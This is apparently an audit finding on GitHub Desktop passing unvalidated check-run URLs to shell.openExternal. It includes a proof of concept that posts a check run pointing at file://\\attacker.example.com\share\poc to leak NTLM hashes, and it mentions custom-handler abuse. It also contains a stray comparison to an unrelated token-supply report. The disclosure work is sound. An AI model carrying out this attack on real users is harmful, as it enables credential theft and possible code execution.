### Title
Unvalidated `checkRun.htmlUrl` from GitHub Checks API reaches `shell.openExternal` with no scheme restriction - (File: `app/src/main-process/main.ts`, `app/src/ui/check-runs/ci-check-run-popover.tsx`)

### Summary
Desktop lets a user click "View on GitHub" / "View details" for a CI check run. The URL displayed comes directly from the GitHub Checks API's `html_url` (`details_url`) field, which is fully controlled by whichever GitHub App/CI integration posted the check run — not validated or restricted to `https://github.com` in any way, and it is passed straight to `shell.openExternal`.

### Finding Description
`apiCheckRunToRefCheck` copies the API's `html_url` verbatim into `IRefCheck.htmlUrl` with no scheme/host validation: [1](#0-0) 

This value is later used directly to open a browser/external handler: [2](#0-1) [3](#0-2) 

Both call `dispatcher.openInBrowser(url)`, which goes to `AppStore._openInBrowser`: [4](#0-3) 

`shell.openExternal` in the renderer is a thin IPC proxy to the main process: [5](#0-4) [6](#0-5) 

The main-process IPC handler for `open-external` performs **no scheme validation at all** — it only *logs* when the URL happens to start with `http(s)://`, but unconditionally calls Electron's `shell.openExternal` regardless of scheme: [7](#0-6) 

This is exactly the class of bug the seed report describes: a validation routine (`_validateDeploymentConfig` in the Sherlock report; the `open-external` handler here) checks *some* conditions (maxSupply/tokensPerMint > 0; whether the string starts with http/https) but omits the condition that actually matters (tokensPerMint ≤ maxSupply; whether the scheme is restricted to http/https before calling a powerful primitive). Compare this to the markdown link interceptor elsewhere in the codebase, which does correctly gate on `/^https?:/` before firing its callback: [8](#0-7) 
— the `open-external` IPC handler and the check-run "view details" flow do not apply this same guard, so any scheme (`file://`, UNC paths like `file://\\attacker-host\share`, or arbitrary registered custom URI protocol handlers) reaches `shell.openExternal` unfiltered.

### Impact Explanation
`shell.openExternal` with an attacker-chosen, non-`http(s)` scheme is a well-known Electron footgun:
- On Windows, a `file://\\attacker-controlled-host\share\x` (UNC-style) URL causes the OS to initiate outbound SMB authentication, leaking the current user's NTLM hash to the attacker's server — a credential-exfiltration primitive achievable purely by the victim clicking "View on GitHub"/"View details" on a hostile CI check run.
- Arbitrary custom URI-scheme handlers registered on the victim's machine (browser extensions, other installed apps) can be invoked with attacker-chosen arguments, which has historically enabled remote code execution (e.g., the "Follina"-style `search-ms:`/`ms-msdt:` handler abuse pattern) — again with no interaction beyond a single click inside the trusted Desktop app.
This satisfies the "Valid Impact" bar: the attacker only needs control over a GitHub API object (a check run posted by a CI app/workflow they control, e.g. via a PR from a fork that triggers checks, or a malicious integration installed on the org) and the victim's ordinary click on a UI affordance inside Desktop — no local access, no leaked credentials, no social-engineering beyond a normal click a user would make while reviewing CI status.

### Likelihood Explanation
Any GitHub App or Actions workflow that reports a check run can set an arbitrary `details_url`/`html_url` for that check. A user who opens a PR containing (or is a collaborator/maintainer reviewing) such a check and clicks "View on GitHub" / "View details" in the check-runs popover or the "Checks failed" notification dialog will trigger this without any other user action. This is a normal, expected user workflow (checking CI results), making the likelihood high relative to the required setup (attacker just needs the ability to post a check run against a repository the victim uses Desktop with — trivial via a public fork or an installed third-party CI/App integration).

### Recommendation
Add scheme validation, mirroring the pattern already used in `sandboxed-markdown.tsx`, before calling `shell.openExternal`:
- In `app/src/main-process/main.ts`'s `open-external` IPC handler, reject/refuse (or explicitly reroute through a safer path) any URL that does not start with `http://` or `https://`, instead of merely logging.
- In `AppStore._openInBrowser` (`app/src/lib/stores/app-store.ts`) and/or at the call sites in `ci-check-run-popover.tsx` / `pull-request-checks-failed.tsx`, validate `checkRun.htmlUrl` against an `https:`-only allow-list (and ideally restrict host to the expected GitHub/GHE endpoint) before passing it to `dispatcher.openInBrowser`.

### Proof of Concept
1. Attacker creates a GitHub App / Actions workflow that reports a check run (via the Checks API `POST /repos/{owner}/{repo}/check-runs`) with `details_url` set to `file://\\attacker.example.com\share\poc` (or any other non-`https` scheme, e.g. a registered malicious custom protocol) on a public repository or a PR targeting a repo the victim has open in Desktop.
2. Victim, using GitHub Desktop on Windows, opens the PR, sees the failing/pending check, and clicks "View on GitHub" or "View details" in the CI checks popover/notification dialog (`ci-check-run-popover.tsx:152-169` / `pull-request-checks-failed.tsx:375-390`).
3. `dispatcher.openInBrowser(checkRun.htmlUrl)` → `_openInBrowser` → IPC `open-external` → `shell.openExternal('file://\\attacker.example.com\share\poc')` executes with no scheme check (`main.ts:581-597`), causing Windows to initiate an SMB connection to the attacker's server, leaking the victim's NTLM credentials (or invoking whatever local handler is registered for the scheme used).

  ipcMain.handle('open-external', async (_, path: string) => {
    const pathLowerCase = path.toLowerCase()
    if (
      pathLowerCase.startsWith('http://') ||
      pathLowerCase.startsWith('https://')
    ) {
      log.info(`opening in browser: ${path}`)
    }

    try {
      await shell.openExternal(path)
      return true
    } catch (e) {
      log.error(`Call to openExternal failed: '${e}'`)
      return false
    }
  })
